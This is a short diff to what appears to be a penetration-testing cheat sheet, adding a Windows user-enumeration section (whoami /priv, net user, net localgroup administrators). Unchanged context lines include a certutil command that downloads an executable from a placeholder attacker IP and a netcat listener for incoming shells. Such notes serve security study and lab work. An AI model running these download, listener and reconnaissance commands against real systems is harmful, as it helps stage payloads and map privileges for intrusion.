@@ -103,7 +103,7 @@ sc query [application]
 
 certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicationname.exe]
 
-### Windows system enumeration
+### Windows System Enumeration
 systeminfo
 
 hostname
@@ -112,6 +112,22 @@ hostname
 (Patching enum) wmic qfe get Caption,Description,HotFixID,InstalledOn  
 
 (Driver enum) wmic logicaldisk get caption,description,providername  
+
+### Windows User Enumeration
+
+whoami
+
+whoami /priv
+
+whoami /groups
+
+(list all local user accounts on the windows system) net user
+
+net user example user
+
+(list all local group memberships) net localgroup
+
+(list all users in the administrator group) net localgroup administrators
 
 ## Listener
 nc -nlvp [port]
